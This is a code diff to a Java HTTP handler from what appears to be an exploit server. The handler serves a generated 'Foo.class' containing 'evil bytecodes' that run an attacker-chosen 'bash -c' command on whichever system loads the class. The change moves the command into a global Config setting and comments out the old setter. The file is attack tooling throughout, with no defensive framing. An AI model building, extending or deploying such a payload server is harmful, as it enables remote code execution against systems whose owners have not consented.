@@ -2,6 +2,7 @@ package server.http.handler;
 
 import asm.ExecObjectFactory;
 import asm.context.ASMContext;
+import cli.Config;
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
 
@@ -10,15 +11,15 @@ import java.io.OutputStream;
 import java.time.LocalTime;
 
 public class ExecHandler implements HttpHandler {
-    private String command;
+//    private String command;
 
     @Override
     public void handle(HttpExchange exchange) throws IOException {
         String method = exchange.getRequestMethod();
         System.out.printf("[HTTP] %s %s - /Foo.class\n", LocalTime.now().toString(), method);
 
-        byte[] bytes = new ASMContext(new ExecObjectFactory(this.command)).executeOF();
-        System.out.printf("[HTTP] compiled evil bytecodes Foo.class >> execute command [%s]\n", this.command);
+        byte[] bytes = new ASMContext(new ExecObjectFactory()).executeOF();
+        System.out.printf("[HTTP] compiled evil bytecodes Foo.class >> execute command [bash -c '%s']\n", Config.command);
         exchange.sendResponseHeaders(200, 0);
         OutputStream out = exchange.getResponseBody();
         out.write(bytes);
@@ -26,8 +27,8 @@ public class ExecHandler implements HttpHandler {
         out.close();
     }
 
-    public HttpHandler acceptCmd(String command) {
-        this.command = command;
-        return this;
-    }
+//    public HttpHandler acceptCmd(String command) {
+//        this.command = command;
+//        return this;
+//    }
 }
